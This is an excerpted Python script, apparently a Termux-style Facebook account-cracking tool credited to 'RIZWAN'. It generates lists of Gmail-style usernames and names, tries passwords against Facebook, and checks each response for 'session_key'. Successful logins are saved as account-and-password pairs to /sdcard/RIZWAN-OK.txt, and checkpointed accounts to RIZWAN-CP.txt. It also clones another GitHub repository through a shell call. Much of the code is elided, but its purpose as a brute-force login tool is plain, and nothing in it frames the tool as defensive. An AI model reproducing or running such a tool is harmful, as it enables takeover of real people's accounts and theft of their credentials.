...
\033[1;97m Owner  : RIZWAN :/

\033[1;97m GitHub : RIZU01 :/
...
def Hxw_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/RIZU01/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=Rizwan-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=Rizwan-2233]'))

####@-----Gmail-----@####

def gmail():     

        os.system('rm -rf .Rizwan')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.Rizwan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            ...
            fo = open('.Rizwan', 'r').read().splitlines()
...
def method():
    ...
    print(f"{oo('•')}/sdcard/RIZWAN-OK.txt")
     ...
     try:
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                print('\r\033[1;92m[\033[1;97mRIZWAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')

                open('/sdcard/RIZWAN-OK.txt','a').write(f'{acc} • {pword}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mRIZWAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')

                cpacc.append(acc)

                open('/sdcard/RIZWAN-CP.txt','a').write(f'{acc} • {pword}\n')
...
def andom():
    ...
    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfcfxsrCuQwzA6r6K2cKVv9j_8DMX2ifHam3b9U--uVq5tEtZLa5o3D0TDorM-xFLtnOoEhjfyLKbyUf6f5qKv7sNz8WZ9vbL1hvg7dRl22CxQ&smuh=49317&lh=Ac_I2tkE__m0U7rYNA4&refid=31&ref_component=mbasic_footer&_rdr',
